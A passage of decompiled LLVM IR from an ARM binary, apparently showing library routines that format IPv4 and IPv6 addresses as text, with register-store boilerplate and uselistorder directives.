  %v1_16140 = phi i32 [ %v2_1611c, %dec_label_pc_1613c.preheader ], [ %v1_1613c.pre, %dec_label_pc_16130 ]
  %v0_16148 = phi i32 [ 1, %dec_label_pc_1613c.preheader ], [ %v0_1613c.pre, %dec_label_pc_16130 ]
  %v2_1613c = sub i32 %v0_16148, %v1_16140
  %v4_1613c = xor i32 %v0_16148, %v1_16140
  %v5_1613c = xor i32 %v2_1613c, %v0_16148
  %v6_1613c = and i32 %v5_1613c, %v4_1613c
  %v7_1613c = icmp slt i32 %v6_1613c, 0
  %v8_1613c = icmp slt i32 %v2_1613c, 0
  %v9_1613c = icmp eq i32 %v0_16148, %v1_16140
  %v2_16140 = sub i32 %v1_16140, %v0_16148
  store i32 %v2_16140, i32* %r1.global-to-local, align 4
  %v1_16148 = add i32 %v0_16148, 1
  store i32 %v1_16148, i32* %r2.global-to-local, align 4
  %v3_1614c = xor i1 %v8_1613c, %v7_1613c
  %v4_1614c = or i1 %v9_1613c, %v3_1614c
  br i1 %v4_1614c, label %dec_label_pc_16130, label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %dec_label_pc_1613c
  store i32 %v0_16150, i32* @r4, align 4
  br label %dec_label_pc_16154

dec_label_pc_16154:                               ; preds = %dec_label_pc_16110, %dec_label_pc_16150
  %v0_16154 = phi i32 [ %v0_16150, %dec_label_pc_16150 ], [ %v0_16154.pre, %dec_label_pc_16110 ]
  %v1_16154 = phi i32 [ %v0_16150, %dec_label_pc_16150 ], [ %v1_16154.pre, %dec_label_pc_16110 ]
  %v9_16154 = icmp eq i32 %v0_16154, %v1_16154
  br i1 %v9_16154, label %dec_label_pc_1615c, label %dec_label_pc_16174

dec_label_pc_1615c:                               ; preds = %dec_label_pc_16154
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_15fc4, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_16168 = call i32 @function_f700()
  br label %dec_label_pc_1618c

dec_label_pc_16174:                               ; preds = %dec_label_pc_1602c, %dec_label_pc_16058, %dec_label_pc_16078, %dec_label_pc_1606c, %dec_label_pc_16118, %dec_label_pc_160bc, %dec_label_pc_160a8, %dec_label_pc_16154, %dec_label_pc_15fe8, %dec_label_pc_160f0, %dec_label_pc_160b0
  br label %dec_label_pc_1618c

dec_label_pc_1617c:                               ; preds = %dec_label_pc_15fa8
  %v0_1617c = call i32 @function_d0ec()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_16184 = inttoptr i32 %v0_1617c to i32*
  store i32 97, i32* %v2_16184, align 4
  br label %dec_label_pc_1618c

dec_label_pc_1618c:                               ; preds = %dec_label_pc_16174, %dec_label_pc_1615c, %dec_label_pc_15fb4, %dec_label_pc_1617c
  %v1_16194 = phi i32 [ 0, %dec_label_pc_16174 ], [ 1, %dec_label_pc_1615c ], [ %v3_15fbc, %dec_label_pc_15fb4 ], [ -1, %dec_label_pc_1617c ]
  store i32 %v3_15f88, i32* @r4, align 4
  store i32 %v6_15f88, i32* @r5, align 4
  store i32 %v9_15f88, i32* @r6, align 4
  store i32 %v12_15f88, i32* @r7, align 4
  store i32 %v27_15f88, i32* @lr, align 4
  ret i32 %v1_16194

; uselistorder directives
  uselistorder i32 %v2_16140, { 1, 0 }
  uselistorder i32 %v2_1613c, { 1, 0 }
  uselistorder i32 %v0_16148, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_16140, { 1, 3, 0, 2 }
  uselistorder i32 %v0_16150, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16154.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16154.pre, { 2, 0, 1 }
  uselistorder i32 %v3_16100, { 1, 0 }
  uselistorder i32 %v0_160e8.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_160d8, { 1, 0 }
  uselistorder i32 %v0_160b0, { 1, 0, 2 }
  uselistorder i32 %v3_16084, { 1, 0 }
  uselistorder i32 %v0_16078, { 1, 0, 2 }
  uselistorder i32 %v1_16024, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_16000, { 1, 0 }
  uselistorder i8** %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @function_15eb8, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1618c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16174, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_16154, { 1, 0 }
  uselistorder label %dec_label_pc_1613c, { 1, 0 }
  uselistorder label %dec_label_pc_16110, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_160d8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16014, { 1, 0 }
}

define i32 @function_161a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_161a4:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_161a4 = load i32, i32* @r4, align 4
  %v12_161a4 = load i32, i32* @r7, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1627c = ptrtoint i32* %stack_var_-40 to i32
  %v2_1625c = add i32 %v2_1627c, -17
  br label %dec_label_pc_1627c

dec_label_pc_161cc:                               ; preds = %dec_label_pc_1627c
  %v0_161cc = load i32, i32* %fp.global-to-local, align 4
  %v2_161cc = add i32 %v0_161cc, %v1_161cc
  %v3_161cc = inttoptr i32 %v2_161cc to i8*
  %v4_161cc = load i8, i8* %v3_161cc, align 1
  %v6_161cc = zext i8 %v4_161cc to i32
  store i32 %v6_161cc, i32* @r4, align 4
  store i32 %v6_161cc, i32* @r0, align 4
  %v0_161d4 = call i32 @function_cb30()
  store i32 %v0_161d4, i32* %r0.global-to-local, align 4
  %v1_161d8 = add i32 %v0_161d4, 48
  %v1_161dc = trunc i32 %v1_161d8 to i8
  %v2_161dc = load i32, i32* %r5.global-to-local, align 4
  %v3_161dc = add i32 %v2_161dc, -17
  %v4_161dc = inttoptr i32 %v3_161dc to i8*
  store i8 %v1_161dc, i8* %v4_161dc, align 1
  %v0_161e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_161e0 = add i32 %v0_161e0, -17
  %v2_161e0 = inttoptr i32 %v1_161e0 to i8*
  %v3_161e0 = load i8, i8* %v2_161e0, align 1
  %v0_161e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_161e4 = add i32 %v0_161e4, 1
  store i32 %v1_161e4, i32* %r6.global-to-local, align 4
  store i32 %v2_1627c, i32* %r2.global-to-local, align 4
  %v7_161ec = icmp eq i8 %v3_161e0, 48
  store i32 10, i32* @r1, align 4
  %v0_161f4 = load i32, i32* @r4, align 4
  store i32 %v0_161f4, i32* @r0, align 4
  %v2_161f8 = add i32 %v1_161e4, %v2_1627c
  store i32 %v2_161f8, i32* %r8.global-to-local, align 4
  %v0_161fc = load i32, i32* %fp.global-to-local, align 4
  %v1_161fc = load i32, i32* %sl.global-to-local, align 4
  %v2_161fc = add i32 %v1_161fc, %v0_161fc
  store i32 %v2_161fc, i32* %sb.global-to-local, align 4
  %v0_16204 = call i32 @function_cb30()
  %v1_1620c = urem i32 %v0_16204, 256
  store i32 %v1_1620c, i32* %r0.global-to-local, align 4
  %v2_16210 = call i32 @function_cc2c(i32 %v1_1620c, i32 10)
  store i32 %v2_16210, i32* %r0.global-to-local, align 4
  br i1 %v7_161ec, label %dec_label_pc_16204, label %dec_label_pc_1622c

dec_label_pc_16204:                               ; preds = %dec_label_pc_161cc
  %v1_16220 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v1_16220, i32* @r7, align 4
  %v2_16224 = load i32, i32* %r5.global-to-local, align 4
  %v3_16224 = add i32 %v2_16224, -17
  %v4_16224 = inttoptr i32 %v3_16224 to i8*
  store i8 58, i8* %v4_16224, align 1
  br label %dec_label_pc_16248

dec_label_pc_1622c:                               ; preds = %dec_label_pc_161cc
  %v2_16240 = load i32, i32* %r8.global-to-local, align 4
  %v3_16240 = add i32 %v2_16240, -17
  %v4_16240 = inttoptr i32 %v3_16240 to i8*
  store i8 58, i8* %v4_16240, align 1
  %v0_16244 = load i32, i32* %r6.global-to-local, align 4
  %v1_16244 = add i32 %v0_16244, 1
  store i32 %v1_16244, i32* @r7, align 4
  br label %dec_label_pc_16248

dec_label_pc_16248:                               ; preds = %dec_label_pc_16204, %dec_label_pc_1622c
  %v0_16248 = load i32, i32* %sb.global-to-local, align 4
  %v1_16248 = inttoptr i32 %v0_16248 to i8*
  %v2_16248 = load i8, i8* %v1_16248, align 1
  %v3_16248 = zext i8 %v2_16248 to i32
  store i32 %v3_16248, i32* %r0.global-to-local, align 4
  %v2_16250 = call i32 @function_cc2c(i32 %v3_16248, i32 10)
  store i32 %v2_1627c, i32* %ip.global-to-local, align 4
  %v0_16258 = load i32, i32* @r7, align 4
  %v1_16258 = add i32 %v0_16258, 1
  store i32 %v1_16258, i32* %r0.global-to-local, align 4
  %v3_16264 = add i32 %v2_1625c, %v0_16258
  %v4_16264 = inttoptr i32 %v3_16264 to i8*
  store i8 58, i8* %v4_16264, align 1
  %v0_16268 = load i32, i32* %ip.global-to-local, align 4
  %v1_16268 = load i32, i32* %r0.global-to-local, align 4
  %v2_16268 = add i32 %v1_16268, %v0_16268
  store i32 %v2_16268, i32* %r2.global-to-local, align 4
  %v3_16270 = add i32 %v2_16268, -17
  %v4_16270 = inttoptr i32 %v3_16270 to i8*
  store i8 46, i8* %v4_16270, align 1
  %v0_16274 = load i32, i32* %r0.global-to-local, align 4
  %v1_16274 = add i32 %v0_16274, 1
  store i32 %v1_16274, i32* %r6.global-to-local, align 4
  %v0_16278 = load i32, i32* %sl.global-to-local, align 4
  %v1_16278 = add i32 %v0_16278, 1
  store i32 %v1_16278, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1627c

dec_label_pc_1627c:                               ; preds = %dec_label_pc_161a4, %dec_label_pc_16248
  %v0_16288 = phi i32 [ 0, %dec_label_pc_161a4 ], [ %v1_16274, %dec_label_pc_16248 ]
  %v1_161cc = phi i32 [ 0, %dec_label_pc_161a4 ], [ %v1_16278, %dec_label_pc_16248 ]
  store i32 %v2_1627c, i32* %ip.global-to-local, align 4
  store i32 100, i32* @r1, align 4
  store i32 %v0_16288, i32* @r7, align 4
  %v2_1628c = add i32 %v0_16288, %v2_1627c
  store i32 %v2_1628c, i32* %r5.global-to-local, align 4
  %v7_16290 = icmp sgt i32 %v1_161cc, 3
  br i1 %v7_16290, label %dec_label_pc_16294, label %dec_label_pc_161cc

dec_label_pc_16294:                               ; preds = %dec_label_pc_1627c
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_16298 = ptrtoint i32* %stack_var_-57 to i32
  %v3_1629c = add i32 %v2_1628c, -18
  %v4_1629c = inttoptr i32 %v3_1629c to i8*
  store i8 0, i8* %v4_1629c, align 1
  store i32 %v2_16298, i32* @r0, align 4
  %v0_162a4 = call i32 @function_f670()
  store i32 %v0_162a4, i32* %r0.global-to-local, align 4
  %v2_162a8 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_162a8, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_162a4, %v2_162a8
  br i1 %tmp, label %dec_label_pc_162b4, label %dec_label_pc_162c8

dec_label_pc_162b4:                               ; preds = %dec_label_pc_16294
  %v0_162b4 = call i32 @function_d0ec()
  store i32 %v0_162b4, i32* %r0.global-to-local, align 4
  %v0_162bc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_162bc, i32* %r2.global-to-local, align 4
  %v2_162c0 = inttoptr i32 %v0_162b4 to i32*
  store i32 28, i32* %v2_162c0, align 4
  %v0_162d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_162d8

dec_label_pc_162c8:                               ; preds = %dec_label_pc_16294
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_16298, i32* @r1, align 4
  %v2_162d0 = inttoptr i32 %arg2 to i8*
  %v3_162d0 = call i32 @function_f8ec(i8* %v2_162d0, i32 %v2_16298)
  store i32 %v3_162d0, i32* %r0.global-to-local, align 4
  store i32 %v3_162d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_162d8

dec_label_pc_162d8:                               ; preds = %dec_label_pc_162b4, %dec_label_pc_162c8
  %v0_162d8 = phi i32 [ %v0_162d8.pre, %dec_label_pc_162b4 ], [ %v3_162d0, %dec_label_pc_162c8 ]
  store i32 %v0_162d8, i32* %r0.global-to-local, align 4
  store i32 %v3_161a4, i32* @r4, align 4
  store i32 %v12_161a4, i32* @r7, align 4
  ret i32 %v0_162d8

; uselistorder directives
  uselistorder i32 %v0_162d8, { 1, 0 }
  uselistorder i32 %v2_16298, { 1, 0, 2 }
  uselistorder i32 %v1_161cc, { 1, 0 }
  uselistorder i32 %v1_1620c, { 1, 0 }
  uselistorder i32 %v2_1627c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 8, 5, 6, 7, 9, 11, 10, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32)* @function_cc2c, { 9, 8, 6, 5, 4, 3, 2, 1, 7, 0 }
  uselistorder i8 48, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @function_cb30, { 13, 12, 11, 9, 8, 7, 6, 5, 4, 10, 1, 3, 2, 0 }
  uselistorder i32 -17, { 2, 3, 4, 5, 6, 0, 7, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_162d8, { 1, 0 }
  uselistorder label %dec_label_pc_1627c, { 1, 0 }
  uselistorder label %dec_label_pc_16248, { 1, 0 }
}

define i32 @function_162e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_162e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_162e8 = load i32, i32* @r5, align 4
  %v7_162f4 = icmp eq i32 %arg1, 2
  store i1 %v7_162f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_162f4, label %dec_label_pc_16318, label %dec_label_pc_1630c

dec_label_pc_1630c:                               ; preds = %dec_label_pc_162e8
  %v7_1630c = icmp eq i32 %arg1, 10
  store i1 %v7_1630c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1630c, label %dec_label_pc_1632c, label %dec_label_pc_16540

dec_label_pc_16318:                               ; preds = %dec_label_pc_162e8
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_16324 = call i32 @function_161a4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_16538

dec_label_pc_1632c:                               ; preds = %dec_label_pc_1630c
  %v2_1632c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1632c, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_16338 = bitcast i32* %stack_var_-72 to i8*
  %v3_16338 = call i32 @function_f5d0(i8* %v2_16338, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1635c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_16340

dec_label_pc_16340:                               ; preds = %dec_label_pc_16340.dec_label_pc_16340_crit_edge, %dec_label_pc_1632c
  %v0_16358 = phi i32 [ %v0_16340.pre, %dec_label_pc_16340.dec_label_pc_16340_crit_edge ], [ 0, %dec_label_pc_1632c ]
  %v1_16340 = load i32, i32* @r8, align 4
  %v2_16340 = add i32 %v1_16340, %v0_16358
  %v3_16344 = inttoptr i32 %v2_16340 to i8*
  %v4_16344 = load i8, i8* %v3_16344, align 1
  %v6_16344 = zext i8 %v4_16344 to i32
  %v1_16348 = add i32 %v2_16340, 1
  %v2_16348 = inttoptr i32 %v1_16348 to i8*
  %v3_16348 = load i8, i8* %v2_16348, align 1
  %v4_16348 = zext i8 %v3_16348 to i32
  %tmp73 = icmp slt i32 %v0_16358, 0
  %v4_1634c = zext i1 %tmp73 to i32
  %v5_1634c = add i32 %v4_1634c, %v0_16358
  %v4_16350 = mul nuw nsw i32 %v6_16344, 256
  %v5_16350 = or i32 %v4_16348, %v4_16350
  store i32 %v5_16350, i32* %r2.global-to-local, align 4
  %v3_16354 = sdiv i32 %v5_1634c, 2
  %v1_16358 = add i32 %v0_16358, 2
  store i32 %v1_16358, i32* %r0.global-to-local, align 4
  %v4_16360 = mul i32 %v3_16354, 4
  %v5_16360 = add i32 %v4_16360, %v2_1635c
  %v7_16364 = icmp eq i32 %v1_16358, 15
  store i1 %v7_16364, i1* %cpsr_z.global-to-local, align 1
  %v2_16368 = add i32 %v5_16360, -32
  %v3_16368 = inttoptr i32 %v2_16368 to i32*
  store i32 %v5_16350, i32* %v3_16368, align 4
  %v7_1636c = icmp sgt i32 %v1_16358, 15
  br i1 %v7_1636c, label %dec_label_pc_16370, label %dec_label_pc_16340.dec_label_pc_16340_crit_edge

dec_label_pc_16340.dec_label_pc_16340_crit_edge:  ; preds = %dec_label_pc_16340
  %v0_16340.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16340

dec_label_pc_16370:                               ; preds = %dec_label_pc_16340
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16388

dec_label_pc_16388:                               ; preds = %dec_label_pc_16370, %dec_label_pc_163d4
  %v0_163c8 = phi i32 [ -1, %dec_label_pc_16370 ], [ %v0_163fc, %dec_label_pc_163d4 ]
  %v0_163b8 = phi i32 [ -1, %dec_label_pc_16370 ], [ %v0_163e8, %dec_label_pc_163d4 ]
  %v0_1639c = phi i32 [ -1, %dec_label_pc_16370 ], [ %v0_1639c7, %dec_label_pc_163d4 ]
  %v0_163d4 = phi i32 [ 0, %dec_label_pc_16370 ], [ %v1_163d4, %dec_label_pc_163d4 ]
  store i32 %v2_1635c, i32* @lr, align 4
  %v4_1638c = mul nuw nsw i32 %v0_163d4, 4
  %v5_1638c = add i32 %v4_1638c, %v2_1635c
  %v1_16390 = add i32 %v5_1638c, -32
  %v2_16390 = inttoptr i32 %v1_16390 to i32*
  %v3_16390 = load i32, i32* %v2_16390, align 4
  %v2_16394 = icmp eq i32 %v3_16390, 0
  %v7_1639c = icmp eq i32 %v0_1639c, -1
  br i1 %v2_16394, label %dec_label_pc_1639c, label %dec_label_pc_163b0

dec_label_pc_1639c:                               ; preds = %dec_label_pc_16388
  br i1 %v7_1639c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1639c
  store i32 %v0_163d4, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_163d4

.thread:                                          ; preds = %dec_label_pc_1639c
  %v1_163a8.pre = load i32, i32* @r4, align 4
  %v2_163a8 = add i32 %v1_163a8.pre, 1
  store i32 %v2_163a8, i32* @r4, align 4
  br label %dec_label_pc_163d4

dec_label_pc_163b0:                               ; preds = %dec_label_pc_16388
  br i1 %v7_1639c, label %dec_label_pc_163d4, label %dec_label_pc_163b8

dec_label_pc_163b8:                               ; preds = %dec_label_pc_163b0
  %v7_163b8 = icmp eq i32 %v0_163b8, -1
  %v0_163cc.pre = load i32, i32* @r4, align 4
  %v1_163c0 = load i32, i32* @r7, align 4
  %v7_163c4 = icmp sgt i32 %v0_163cc.pre, %v1_163c0
  %or.cond = or i1 %v7_163b8, %v7_163c4
  br i1 %or.cond, label %dec_label_pc_163c8, label %dec_label_pc_163d0

dec_label_pc_163c8:                               ; preds = %dec_label_pc_163b8
  store i32 %v0_163c8, i32* @r6, align 4
  store i32 %v0_163cc.pre, i32* @r7, align 4
  br label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %dec_label_pc_163b8, %dec_label_pc_163c8
  %v0_163b812 = phi i32 [ %v0_163c8, %dec_label_pc_163c8 ], [ %v0_163b8, %dec_label_pc_163b8 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %bb, %.thread, %dec_label_pc_163b0, %dec_label_pc_163d0
  %v0_163fc = phi i32 [ %v0_163c8, %.thread ], [ %v0_163d4, %bb ], [ %v0_163c8, %dec_label_pc_163b0 ], [ -1, %dec_label_pc_163d0 ]
  %v0_1639c7 = phi i32 [ %v0_1639c, %.thread ], [ %v0_163d4, %bb ], [ -1, %dec_label_pc_163b0 ], [ -1, %dec_label_pc_163d0 ]
  %v0_163e8 = phi i32 [ %v0_163b8, %.thread ], [ %v0_163b8, %bb ], [ %v0_163b8, %dec_label_pc_163b0 ], [ %v0_163b812, %dec_label_pc_163d0 ]
  %v1_163d4 = add nuw nsw i32 %v0_163d4, 1
  %v7_163dc = icmp slt i32 %v1_163d4, 8
  br i1 %v7_163dc, label %dec_label_pc_16388, label %dec_label_pc_163e0

dec_label_pc_163e0:                               ; preds = %dec_label_pc_163d4
  %v7_163e0 = icmp eq i32 %v0_163fc, -1
  store i1 %v7_163e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_163e0, label %dec_label_pc_163e0.dec_label_pc_16400_crit_edge, label %dec_label_pc_163e8

dec_label_pc_163e0.dec_label_pc_16400_crit_edge:  ; preds = %dec_label_pc_163e0
  %v1_16424.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16400

dec_label_pc_163e8:                               ; preds = %dec_label_pc_163e0
  %v7_163e8 = icmp eq i32 %v0_163e8, -1
  store i1 %v7_163e8, i1* %cpsr_z.global-to-local, align 1
  %v0_163f8.pre = load i32, i32* @r4, align 4
  br i1 %v7_163e8, label %dec_label_pc_163f8, label %dec_label_pc_163f0

dec_label_pc_163f0:                               ; preds = %dec_label_pc_163e8
  %v1_163f0 = load i32, i32* @r7, align 4
  %v9_163f0 = icmp eq i32 %v0_163f8.pre, %v1_163f0
  store i1 %v9_163f0, i1* %cpsr_z.global-to-local, align 1
  %v7_163f4 = icmp sgt i32 %v0_163f8.pre, %v1_163f0
  br i1 %v7_163f4, label %dec_label_pc_163f8, label %dec_label_pc_16400

dec_label_pc_163f8:                               ; preds = %dec_label_pc_163e8, %dec_label_pc_163f0
  store i32 %v0_163f8.pre, i32* @r7, align 4
  store i32 %v0_163fc, i32* @r6, align 4
  br label %dec_label_pc_16400

dec_label_pc_16400:                               ; preds = %dec_label_pc_163e0.dec_label_pc_16400_crit_edge, %dec_label_pc_163f0, %dec_label_pc_163f8
  %v1_16424.pre = phi i32 [ %v1_163f0, %dec_label_pc_163f0 ], [ %v1_16424.pre.pre, %dec_label_pc_163e0.dec_label_pc_16400_crit_edge ], [ %v0_163f8.pre, %dec_label_pc_163f8 ]
  %v0_16400 = phi i32 [ %v0_163e8, %dec_label_pc_163f0 ], [ %v0_163e8, %dec_label_pc_163e0.dec_label_pc_16400_crit_edge ], [ %v0_163fc, %dec_label_pc_163f8 ]
  %v7_16400 = icmp eq i32 %v0_16400, -1
  store i1 %v7_16400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16400, label %dec_label_pc_16400._crit_edge, label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %dec_label_pc_16400
  %v7_16408 = icmp eq i32 %v1_16424.pre, 1
  store i1 %v7_16408, i1* %cpsr_z.global-to-local, align 1
  %v7_1640c = icmp slt i32 %v1_16424.pre, 2
  br i1 %v7_1640c, label %bb54, label %dec_label_pc_16400._crit_edge

bb54:                                             ; preds = %dec_label_pc_16408
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_16400._crit_edge

dec_label_pc_16400._crit_edge:                    ; preds = %dec_label_pc_16400, %dec_label_pc_16408, %bb54
  %v0_16424 = phi i32 [ %v0_16400, %dec_label_pc_16408 ], [ -1, %bb54 ], [ %v0_16400, %dec_label_pc_16400 ]
  %v2_16414 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_16414, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1adb8.656 to i32), i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_16424 = add i32 %v0_16424, %v1_16424.pre
  store i32 %v2_16424, i32* @sl, align 4
  %v9_16484 = icmp eq i32 %tmp, ptrtoint (i32* @global_var_ffff.530 to i32)
  %v7_1642c67 = icmp eq i32 %v0_16424, -1
  store i1 %v7_1642c67, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1642c

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16400._crit_edge, %dec_label_pc_164dc
  %v7_1642c71 = phi i1 [ %v7_1642c67, %dec_label_pc_16400._crit_edge ], [ %v7_1642c, %dec_label_pc_164dc ]
  %v0_1645870 = phi i32 [ 0, %dec_label_pc_16400._crit_edge ], [ %v1_164dc, %dec_label_pc_164dc ]
  %v1_1644469 = phi i32 [ %v0_16424, %dec_label_pc_16400._crit_edge ], [ %v0_1642c.pre, %dec_label_pc_164dc ]
  %v2_1645c68 = phi i32 [ %v2_16414, %dec_label_pc_16400._crit_edge ], [ %v3_1644829, %dec_label_pc_164dc ]
  br i1 %v7_1642c71, label %dec_label_pc_16450, label %dec_label_pc_16434

dec_label_pc_16434:                               ; preds = %dec_label_pc_1642c
  %v9_16434 = icmp eq i32 %v0_1645870, %v1_1644469
  store i1 %v9_16434, i1* %cpsr_z.global-to-local, align 1
  %v5_16438 = icmp slt i32 %v0_1645870, %v1_1644469
  br i1 %v5_16438, label %dec_label_pc_16450, label %dec_label_pc_1643c

dec_label_pc_1643c:                               ; preds = %dec_label_pc_16434
  %v1_1643c = load i32, i32* @sl, align 4
  %v9_1643c = icmp eq i32 %v0_1645870, %v1_1643c
  store i1 %v9_1643c, i1* %cpsr_z.global-to-local, align 1
  %v6_16440 = icmp slt i32 %v0_1645870, %v1_1643c
  br i1 %v6_16440, label %dec_label_pc_16444, label %dec_label_pc_16450

dec_label_pc_16444:                               ; preds = %dec_label_pc_1643c
  store i1 %v9_16434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16434, label %bb55, label %dec_label_pc_164dc

bb55:                                             ; preds = %dec_label_pc_16444
  %v1_16448 = load i32, i32* @sb, align 4
  %v2_16448 = trunc i32 %v1_16448 to i8
  %v4_16448 = inttoptr i32 %v2_1645c68 to i8*
  store i8 %v2_16448, i8* %v4_16448, align 1
  %v5_16448 = load i32, i32* @r4, align 4
  %v6_16448 = add i32 %v5_16448, 1
  store i32 %v6_16448, i32* @r4, align 4
  br label %dec_label_pc_164dc

dec_label_pc_16450:                               ; preds = %dec_label_pc_1643c, %dec_label_pc_16434, %dec_label_pc_1642c
  %v2_16450 = icmp eq i32 %v0_1645870, 0
  store i1 %v2_16450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16450, label %dec_label_pc_164c0, label %dec_label_pc_16458

dec_label_pc_16458:                               ; preds = %dec_label_pc_16450
  %v7_16458 = icmp eq i32 %v0_1645870, 6
  store i1 %v7_16458, i1* %cpsr_z.global-to-local, align 1
  %v0_1645c = load i32, i32* @sb, align 4
  %v1_1645c = trunc i32 %v0_1645c to i8
  %v3_1645c = inttoptr i32 %v2_1645c68 to i8*
  store i8 %v1_1645c, i8* %v3_1645c, align 1
  %v4_1645c = load i32, i32* @r4, align 4
  %v5_1645c = add i32 %v4_1645c, 1
  store i32 %v5_1645c, i32* @r4, align 4
  %v0_16460 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16460, label %dec_label_pc_16464, label %dec_label_pc_164c0

